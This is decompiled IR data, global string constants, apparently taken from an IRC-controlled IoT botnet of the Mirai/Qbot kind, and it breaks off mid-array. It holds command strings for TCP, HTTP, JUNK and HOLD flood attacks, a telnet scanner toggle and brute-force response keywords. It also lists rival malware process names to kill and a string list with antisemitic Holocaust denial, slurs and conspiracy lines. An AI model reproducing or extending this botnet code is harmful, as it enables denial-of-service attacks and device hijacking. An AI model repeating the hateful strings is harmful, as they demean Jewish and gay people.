@global_var_1002b5f0.428 = constant [24 x i8] c"Never gonna let you die\00"
@global_var_1002b608.429 = constant [21 x i8] c"Never gonna hurt you\00"
@global_var_1002b620.430 = constant [14 x i8] c"bush did 9/11\00"
@global_var_1002b630.431 = constant [32 x i8] c"jet fuel can't melt steel beams\00"
@global_var_1002b650.432 = constant [24 x i8] c"Kuze-senpai is your god\00"
@global_var_1002b668.433 = constant [23 x i8] c"the illuminati is real\00"
@global_var_1002b680.434 = constant [14 x i8] c"wake up sheep\00"
@global_var_1002b690.435 = constant [22 x i8] c"i flex like david ike\00"
@global_var_1002b6a8.436 = constant [35 x i8] c"6 million jews? show me the proof!\00"
@global_var_1002b6cc.437 = constant [18 x i8] c"T R I G G E R E D\00"
@global_var_1002b6e0.438 = constant [21 x i8] c"my gf killed herself\00"
@global_var_1002b6f8.439 = constant [22 x i8] c"free masons suck cock\00"
@global_var_1002b710.440 = constant [10 x i8] c"ihatejews\00"
@global_var_1002b71c.441 = constant [6 x i8] c"urgay\00"
@global_var_1002b724.442 = constant [16 x i8] c"tfw u like dick\00"
@global_var_1002b734.443 = constant [9 x i8] c"dickbutt\00"
@global_var_1002b740.444 = constant [20 x i8] c"The elusive dickbut\00"
@global_var_1002b754.445 = constant [27 x i8] c"Heyyy that's pretty gooood\00"
@global_var_1002b770.446 = constant [15 x i8] c"NSA sucks cock\00"
@global_var_1002b780.447 = constant [15 x i8] c"FBI sucks cock\00"
@global_var_1002b790.448 = constant [55 x i8] c"You name it they suck cockWhat am I doing with my life\00"
@global_var_1002b7c8.449 = constant [28 x i8] c"Oh yeah I like nulling shit\00"
@global_var_1002b7e4.450 = constant [29 x i8] c"HIIYYOOOOOOO (Customgrow420)\00"
@global_var_1002b804.451 = constant [28 x i8] c"Keemstar is a fucking knome\00"
@global_var_1002b820.452 = constant [17 x i8] c"Leafy is gawd <3\00"
@global_var_1002b834.453 = constant [25 x i8] c"Ourmine is full of skids\00"
@global_var_1002b850.454 = constant [23 x i8] c"Sh4dow is the greatest\00"
@global_var_1002b868.455 = constant [79 x i8*] [i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1002b2d0.377, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1002b2d4.378, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1002b2d8.379, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1002b2dc.380, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1002b2e0.381, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1002b2e8.382, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1002b2ec.383, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1002b2f8.384, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1002b304.385, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1002b308.386, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1002b30c.387, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1002b314.388, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1002b320.389, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_1002b330.390, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1002b348.391, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_1002b354.392, i32 0, i32 0), i8* getelementptr inbounds ([23 x i8], [23 x i8]* @global_var_1002b368.393, i32 0, i32 0), i8* getelementptr inbounds ([28 x i8], [28 x i8]* @global_var_1002b380.394, i32 0, i32 0), i8* getelementptr inbounds ([38 x i8], [38 x i8]* @global_var_1002b39c.395, i32 0, i32 0), i8* getelementptr inbounds ([37 x i8], [37 x i8]* @global_var_1002b3c4.396, i32 0, i32 0), i8* getelementptr inbounds ([38 x i8], [38 x i8]* @global_var_1002b3ec.397, i32 0, i32 0), i8* getelementptr inbounds ([37 x i8], [37 x i8]* @global_var_1002b414.398, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1002b43c.399, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1002b44c.400, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1002b454.401, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_1002b460.402, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_1002b490.403, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1002b4a4.404, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1002b4b0.405, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_1002b4c0.406, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1002b4d8.407, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_1002b4c0.406, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1002b4e0.408, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1002b4f0.409, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1002b4f8.410, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1002b500.411, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1002b508.412, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @global_var_1002b510.413, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_1002b534.414, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1002b548.415, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1002b550.416, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1002b558.417, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1002b560.418, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1002b568.419, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1002b574.420, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1002b57c.421, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1002b580.422, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1002b584.423, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1002b590.424, i32 0, i32 0), i8* getelementptr inbounds ([29 x i8], [29 x i8]* @global_var_1002b59c.425, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_1002b5bc.426, i32 0, i32 0), i8* getelementptr inbounds ([25 x i8], [25 x i8]* @global_var_1002b5d4.427, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_1002b5f0.428, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_1002b608.429, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1002b620.430, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_1002b630.431, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_1002b650.432, i32 0, i32 0), i8* getelementptr inbounds ([23 x i8], [23 x i8]* @global_var_1002b668.433, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1002b680.434, i32 0, i32 0), i8* getelementptr inbounds ([22 x i8], [22 x i8]* @global_var_1002b690.435, i32 0, i32 0), i8* getelementptr inbounds ([35 x i8], [35 x i8]* @global_var_1002b6a8.436, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_1002b6cc.437, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_1002b6e0.438, i32 0, i32 0), i8* getelementptr inbounds ([22 x i8], [22 x i8]* @global_var_1002b6f8.439, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1002b710.440, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1002b71c.441, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1002b724.442, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1002b734.443, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_1002b740.444, i32 0, i32 0), i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_1002b754.445, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1002b770.446, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1002b780.447, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @global_var_1002b790.448, i32 0, i32 0), i8* getelementptr inbounds ([28 x i8], [28 x i8]* @global_var_1002b7c8.449, i32 0, i32 0), i8* getelementptr inbounds ([29 x i8], [29 x i8]* @global_var_1002b7e4.450, i32 0, i32 0), i8* getelementptr inbounds ([28 x i8], [28 x i8]* @global_var_1002b804.451, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_1002b820.452, i32 0, i32 0), i8* getelementptr inbounds ([25 x i8], [25 x i8]* @global_var_1002b834.453, i32 0, i32 0), i8* getelementptr inbounds ([23 x i8], [23 x i8]* @global_var_1002b850.454, i32 0, i32 0)]
@global_var_10009588.456 = constant [3 x i8] c"8`\00"
@global_var_10009590.457 = constant i32 939524096
@global_var_1002b9ac.458 = constant [35 x i8] c"NOTICE %s :STD <ip> <port> <time>\0A\00"
@global_var_10009604.459 = constant [3 x i8] c"8`\00"
@global_var_1002b9d0.460 = constant [32 x i8] c"NOTICE %s :STD attacking %s:%s\0A\00"
@global_var_100096dc.461 = constant [3 x i8] c"8`\00"
@global_var_100096e4.462 = constant [3 x i8] c"8`\00"
@global_var_1000976c.463 = constant [3 x i8] c"8`\00"
@global_var_1002b9f0.464 = constant [7 x i8] c"(null)\00"
@global_var_1000ab70.465 = constant [3 x i8] c"8`\00"
@global_var_1002ba30.466 = constant [92 x i8] c"NOTICE %s :TCP <target> <port> <time> <flags/method> <packetsize> <pollinterval> <threads>\0A\00"
@global_var_1000b280.467 = constant i32 1207960248
@global_var_1002ba8c.468 = constant [54 x i8] c"NOTICE %s :TCP flooding %s:%d with %s and %d threads\0A\00"
@global_var_1000b530.469 = constant [3 x i8] c"8`\00"
@global_var_1002bac4.470 = constant [6 x i8] c"close\00"
@global_var_1002bacc.471 = constant [11 x i8] c"keep-alive\00"
@global_var_1002bad8.472 = constant [7 x i8] c"accept\00"
@global_var_1002baec.476 = constant [64 x i8] c"%s %s HTTP/1.1\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0AConnection: %s\0D\0A\0D\0A\00"
@global_var_1000b828.477 = constant i32 939524096
@global_var_1000b8a0.478 = constant [3 x i8] c"8`\00"
@global_var_1002bb2c.479 = constant [64 x i8] c"NOTICE %s :HTTP <method> <target> <port> <path> <time> <power>\0A\00"
@global_var_1002bb6c.480 = constant [46 x i8] c"NOTICE %s :HTTP %s flooding %s with %d power\0A\00"
@global_var_1000ba90.481 = constant [3 x i8] c"8`\00"
@global_var_1000ba98.482 = constant [3 x i8] c"8`\00"
@global_var_1000bb58.483 = constant [3 x i8] c"8`\00"
@global_var_1000bcac.484 = constant i32 939525120
@global_var_1000be08.485 = constant i32 1207960240
@global_var_1002bb9c.486 = constant [36 x i8] c"NOTICE %s :JUNK <ip> <port> <time>\0A\00"
@global_var_1000c188.487 = constant i32 1207959712
@global_var_1002bbc0.488 = constant [32 x i8] c"NOTICE %s :JUNK flooding %s:%s\0A\00"
@global_var_1000c348.489 = constant [3 x i8] c"8`\00"
@global_var_1000c49c.490 = constant i32 1207960392
@global_var_1002bbe0.491 = constant [36 x i8] c"NOTICE %s :HOLD <ip> <port> <time>\0A\00"
@global_var_1000c8b4.492 = constant i32 1207959712
@global_var_1002bc04.493 = constant [32 x i8] c"NOTICE %s :HOLD flooding %s:%s\0A\00"
@global_var_1002a018.495 = constant i32 587202560
@global_var_1002a020.497 = constant [6 x i8] c"shell\00"
@global_var_10029f94.499 = constant [7 x i8] c"nvalid\00"
@global_var_10029f9c.500 = constant [6 x i8] c"ailed\00"
@global_var_10029fa4.501 = constant [9 x i8] c"ncorrect\00"
@global_var_10029fb0.502 = constant [6 x i8] c"enied\00"
@global_var_10029fb8.503 = constant [6 x i8] c"error\00"
@global_var_10029fc0.504 = constant [8 x i8] c"goodbye\00"
@global_var_10029fc8.505 = constant [4 x i8] c"bad\00"
@global_var_10029fcc.506 = constant [8 x i8] c"timeout\00"
@global_var_10040694.507 = global [8 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029f94.499, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029f9c.500, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10029fa4.501, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029fb0.502, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029fb8.503, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029fc0.504, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10029fc8.505, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029fcc.506, i32 0, i32 0)]
@global_var_1000cf08.508 = constant i32 939524098
@global_var_1000d110.509 = constant i32 939524097
@global_var_1000d2c0.510 = constant i32 939524096
@global_var_1002bc24.511 = constant [6 x i8] c":>%$#\00"
@global_var_1000d79c.512 = constant i32 939524096
@global_var_1000d830.513 = constant [3 x i8] c"8`\00"
@global_var_1000d850.514 = constant i32 1208005581
@global_var_1000d92c.515 = constant i32 939524096
@global_var_1002bd30.516 = constant i32 -123616
@global_var_1000dcf8.517 = constant i32 1207963276
@global_var_1000dd18.518 = constant i32 1207963244
@global_var_1002a030.538 = constant [5 x i8] c"rror\00"
@global_var_1002a038.539 = constant [7 x i8] c"oodbye\00"
@global_var_10028c88.540 = constant [8 x i8] c"busybox\00"
@global_var_100451a4.544 = local_unnamed_addr global i32 0
@global_var_1002a040.549 = constant [3 x i8] c"sh\00"
@global_var_1002a044.550 = constant [8 x i8] c"/bin/sh\00"
@global_var_1002a04c.551 = constant [5 x i8] c"dash\00"
@global_var_10029fd4.554 = constant [6 x i8] c"/tmp/\00"
@global_var_10029fdc.555 = constant [6 x i8] c"/var/\00"
@global_var_10029fe4.556 = constant [10 x i8] c"/var/run/\00"
@global_var_10029ff0.557 = constant [10 x i8] c"/dev/shm/\00"
@global_var_10029ffc.558 = constant [6 x i8] c"/mnt/\00"
@global_var_1002a004.559 = constant [7 x i8] c"/boot/\00"
@global_var_1002a00c.560 = constant [6 x i8] c"/usr/\00"
@global_var_10045148.571 = local_unnamed_addr global i32 0
@global_var_1002bd54.572 = constant [29 x i8] c"NOTICE %s :SCANNER <ON/OFF>\0A\00"
@global_var_1000ece0.573 = constant i32 1207960056
@global_var_1002bd74.574 = constant [3 x i8] c"ON\00"
@global_var_1002bd78.575 = constant [3 x i8] c"on\00"
@global_var_1002bd7c.576 = constant [43 x i8] c"PRIVMSG %s :[TELNET] [+] SCANNER STARTED!\0A\00"
@global_var_1000ed7c.577 = constant i32 1207959900
@global_var_1002bda8.578 = constant [51 x i8] c"PRIVMSG %s :[TELNET] [-] FAILED TO START SCANNER!\0A\00"
@global_var_1000eda0.579 = constant i32 1207959864
@global_var_1002bddc.580 = constant [51 x i8] c"PRIVMSG %s :[TELNET] [+] SCANNER ALREADY STARTED!\0A\00"
@global_var_1000edc4.581 = constant i32 1207959828
@global_var_1002be10.582 = constant [4 x i8] c"OFF\00"
@global_var_1002be14.583 = constant [4 x i8] c"off\00"
@global_var_1002be18.584 = constant [42 x i8] c"PRIVMSG %s :[TELNET] [+] SCANNER KILLED!\0A\00"
@global_var_1002be44.585 = constant [50 x i8] c"PRIVMSG %s :[TELNET] [-] FAILED TO KILL SCANNER!\0A\00"
@global_var_1000ee98.586 = constant i32 1207959616
@global_var_1002be78.587 = constant [47 x i8] c"PRIVMSG %s :[TELNET] [+] SCANNER NOT STARTED!\0A\00"
@global_var_1000eebc.588 = constant i32 1207959580
@global_var_10028a70.589 = constant [8 x i8] c"mirai.*\00"
@global_var_10028a78.590 = constant [10 x i8] c"dlr.*mips\00"
@global_var_10028a84.591 = constant [7 x i8] c"mips64\00"
@global_var_10028a8c.592 = constant [7 x i8] c"mipsel\00"
@global_var_10028a94.593 = constant [6 x i8] c"sh2eb\00"
@global_var_10028a9c.594 = constant [7 x i8] c"sh2elf\00"
@global_var_10028aa4.595 = constant [4 x i8] c"sh4\00"
@global_var_10028aa8.596 = constant [4 x i8] c"x86\00"
@global_var_10028aac.597 = constant [4 x i8] c"arm\00"
@global_var_10028ab0.598 = constant [6 x i8] c"armv5\00"
@global_var_10028ab8.599 = constant [8 x i8] c"armv4tl\00"
@global_var_10028ac0.600 = constant [6 x i8] c"armv4\00"
@global_var_10028ac8.601 = constant [6 x i8] c"armv6\00"
@global_var_10028ad0.602 = constant [5 x i8] c"i686\00"
@global_var_10028ad8.603 = constant [8 x i8] c"powerpc\00"
@global_var_10028ae0.604 = constant [13 x i8] c"powerpc440fp\00"
@global_var_10028af0.605 = constant [5 x i8] c"i586\00"
@global_var_10028af8.606 = constant [5 x i8] c"m68k\00"
@global_var_10028b00.607 = constant [6 x i8] c"sparc\00"
@global_var_10028b08.608 = constant [7 x i8] c"x86_64\00"
@global_var_10028b10.609 = constant [8 x i8] c"jackmy*\00"
@global_var_10028b18.610 = constant [8 x i8] c"hackmy*\00"
@global_var_10028b20.611 = constant [3 x i8] c"b1\00"
@global_var_10028b24.612 = constant [3 x i8] c"b2\00"
@global_var_10028b28.613 = constant [3 x i8] c"b3\00"
@global_var_10028b2c.614 = constant [3 x i8] c"b4\00"
@global_var_10028b30.615 = constant [3 x i8] c"b5\00"
@global_var_10028b34.616 = constant [3 x i8] c"b6\00"
@global_var_10028b38.617 = constant [3 x i8] c"b7\00"
@global_var_10028b3c.618 = constant [3 x i8] c"b8\00"
@global_var_10028b40.619 = constant [3 x i8] c"b9\00"
@global_var_10028b44.620 = constant [4 x i8] c"b10\00"
@global_var_10028b48.621 = constant [4 x i8] c"b11\00"
@global_var_10028b4c.622 = constant [4 x i8] c"b12\00"
@global_var_10028b50.623 = constant [4 x i8] c"b13\00"
@global_var_10028b54.624 = constant [4 x i8] c"b14\00"
@global_var_10028b58.625 = constant [4 x i8] c"b15\00"
@global_var_10028b5c.626 = constant [4 x i8] c"b16\00"
@global_var_10028b60.627 = constant [4 x i8] c"b17\00"
@global_var_10028b64.628 = constant [4 x i8] c"b18\00"
@global_var_10028b68.629 = constant [4 x i8] c"b19\00"
@global_var_10028b6c.630 = constant [4 x i8] c"b20\00"
@global_var_10028b70.631 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_10028b84.632 = constant [10 x i8] c"dvrHelper\00"
@global_var_10028b90.633 = constant [5 x i8] c"kmy*\00"
@global_var_10028b98.634 = constant [5 x i8] c"lol*\00"
@global_var_10028ba0.635 = constant [8 x i8] c"telmips\00"
@global_var_10028ba8.636 = constant [10 x i8] c"telmips64\00"
@global_var_10028bb4.637 = constant [10 x i8] c"telmipsel\00"
@global_var_10028bc0.638 = constant [9 x i8] c"telsh2eb\00"
@global_var_10028bcc.639 = constant [10 x i8] c"telsh2elf\00"
@global_var_10028bd8.640 = constant [7 x i8] c"telsh4\00"
@global_var_10028be0.641 = constant [7 x i8] c"telx86\00"
@global_var_10028be8.642 = constant [9 x i8] c"telarmv5\00"
@global_var_10028bf4.643 = constant [11 x i8] c"telarmv4tl\00"
@global_var_10028c00.644 = constant [9 x i8] c"telarmv4\00"
@global_var_10028c0c.645 = constant [9 x i8] c"telarmv6\00"
@global_var_10028c18.646 = constant [8 x i8] c"teli686\00"
@global_var_10028c20.647 = constant [11 x i8] c"telpowerpc\00"
@global_var_10028c2c.648 = constant [16 x i8] c"telpowerpc440fp\00"
@global_var_10028c3c.649 = constant [8 x i8] c"teli586\00"
@global_var_10028c44.650 = constant [8 x i8] c"telm68k\00"
@global_var_10028c4c.651 = constant [9 x i8] c"telsparc\00"
@global_var_10028c58.652 = constant [10 x i8] c"telx86_64\00"
@global_var_10028c64.653 = constant [9 x i8] c"TwoFace*\00"
@global_var_10028c70.654 = constant [5 x i8] c"xxb*\00"
@global_var_10028c78.655 = constant [3 x i8] c"bb\00"
@global_var_10028c7c.656 = constant [11 x i8] c"busybotnet\00"
@global_var_10028c90.657 = constant [7 x i8] c"badbox\00"
@global_var_10028c98.658 = constant [3 x i8] c"B1\00"
@global_var_10028c9c.659 = constant [3 x i8] c"B2\00"
@global_var_10028ca0.660 = constant [3 x i8] c"B3\00"
@global_var_10028ca4.661 = constant [3 x i8] c"B4\00"
@global_var_10028ca8.662 = constant [3 x i8] c"B5\00"
@global_var_10028cac.663 = constant [3 x i8] c"B6\00"
@global_var_10028cb0.664 = constant [3 x i8] c"B7\00"
@global_var_10028cb4.665 = constant [3 x i8] c"B8\00"
@global_var_10028cb8.666 = constant [3 x i8] c"B9\00"
@global_var_10028cbc.667 = constant [4 x i8] c"B10\00"
@global_var_10028cc0.668 = constant [4 x i8] c"B11\00"
@global_var_10028cc4.669 = constant [4 x i8] c"B12\00"
@global_var_10028cc8.670 = constant [4 x i8] c"B13\00"
@global_var_10028ccc.671 = constant [4 x i8] c"B14\00"
@global_var_10028cd0.672 = constant [4 x i8] c"B15\00"
@global_var_10028cd4.673 = constant [4 x i8] c"B16\00"
@global_var_10028cd8.674 = constant [4 x i8] c"B17\00"
@global_var_10028cdc.675 = constant [4 x i8] c"B18\00"
@global_var_10028ce0.676 = constant [4 x i8] c"B20\00"
@global_var_10028ce4.677 = constant [7 x i8] c"gaybot\00"
@global_var_10028cec.678 = constant [6 x i8] c"hackz\00"
@global_var_10028cf4.679 = constant [5 x i8] c"bin*\00"
@global_var_10028cfc.680 = constant [5 x i8] c"gtop\00"
@global_var_10028d04.681 = constant [7 x i8] c"botnet\00"
@global_var_10028d0c.682 = constant [8 x i8] c"swatnet\00"
@global_var_10028d14.683 = constant [8 x i8] c"ballpit\00"
@global_var_10028d1c.684 = constant [8 x i8] c"fucknet\00"
@global_var_10028d24.685 = constant [9 x i8] c"cracknet\00"
@global_var_10028d30.686 = constant [8 x i8] c"weednet\00"
@global_var_10028d38.687 = constant [7 x i8] c"gaynet\00"
@global_var_10028d40.688 = constant [9 x i8] c"queernet\00"
@global_var_10028d4c.689 = constant [8 x i8] c"ballnet\00"
@global_var_10028d54.690 = constant [5 x i8] c"unet\00"
@global_var_10028d5c.691 = constant [7 x i8] c"yougay\00"
@global_var_10028d64.692 = constant [7 x i8] c"sttftp\00"
@global_var_10028d6c.693 = constant [7 x i8] c"sstftp\00"
@global_var_10028d74.694 = constant [7 x i8] c"sbtftp\00"
@global_var_10028d7c.695 = constant [6 x i8] c"btftp\00"
@global_var_10028d84.696 = constant [9 x i8] c"y0u1sg3y\00"
@global_var_10028d90.697 = constant [6 x i8] c"bruv*\00"
@global_var_10028d98.698 = constant [5 x i8] c"IoT*\00"
@global_var_10028da0.699 = constant [6 x i8] c"kawi*\00"
@global_var_10028da8.700 = constant [6 x i8] c"kiwi*\00"
@global_var_10028db0.701 = constant [8 x i8] c"botgod*\00"
@global_var_100400cc.702 = global [114 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10028a70.589, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10028a78.590, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10028a84.591, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10028a8c.592, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10028a94.593, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10028a9c.594, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028aa4.595, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028aa8.596, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028aac.597, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10028ab0.598, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10028ab8.599, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10028ac0.600, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10028ac8.601, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10028ad0.602, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10028ad8.603, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10028ae0.604, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10028af0.605, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10028af8.606, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10028b00.607, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10028b08.608, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10028b10.609, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10028b18.610, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028b20.611, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028b24.612, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028b28.613, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028b2c.614, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028b30.615, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028b34.616, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028b38.617, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028b3c.618, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10028b40.619, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028b44.620, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028b48.621, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028b4c.622, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028b50.623, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028b54.624, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028b58.625, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028b5c.626, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028b60.627, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028b64.628, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028b68.629, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10028b6c.630, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_10028b70.631, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10028b84.632, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10028b90.633, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10028b98.634, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10028ba0.635, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10028ba8.636, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10028bb4.637, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10028bc0.638, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10028bcc.639, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10028bd8.640, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10028be0.641, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10028be8.642, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_10028bf4.643, i32 0, i32 0), i8* getelementptr 